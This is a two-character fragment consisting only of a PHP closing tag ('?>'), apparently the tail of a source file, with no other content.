?>